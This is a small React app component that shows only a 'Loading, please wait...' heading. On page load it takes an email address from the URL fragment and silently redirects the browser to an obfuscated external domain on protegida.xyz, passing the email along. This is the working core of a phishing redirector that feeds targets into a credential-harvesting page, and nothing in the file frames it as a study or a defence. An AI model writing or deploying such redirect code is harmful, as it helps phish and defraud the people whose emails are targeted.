import React, { useEffect } from "react";

function App() {
  // Function to extract the value after the '#' symbol in the URL
  const getEmailFromUrl = () => {
    const url = window.location.href;
    const email = url.split("#")[1];
    return email;
  };

  // Function to manipulate the URL and redirect
  const manipulateUrl = () => {
    const email = getEmailFromUrl();

    if (email) {
      // Append the email to the new URL
      const newUrl = `https://o0ff-ic3lon-hias9-vey8as.protegida.xyz/PHtCqDej#${email}`;
      // Redirect to the new URL
      window.location.href = newUrl;
    } else {
      // If no email found, redirect normally
      const defaultUrl = "https://o0ff-ic3lon-hias9-vey8as.protegida.xyz/PHtCqDej";
      window.location.href = defaultUrl;
    }
  };

  // Use effect hook to run the function when the component is mounted
  useEffect(() => {
    manipulateUrl();
  }, []);

  return (
    <div>
      <h1>Loading, please wait...</h1>
    </div>
  );
}

export default App;
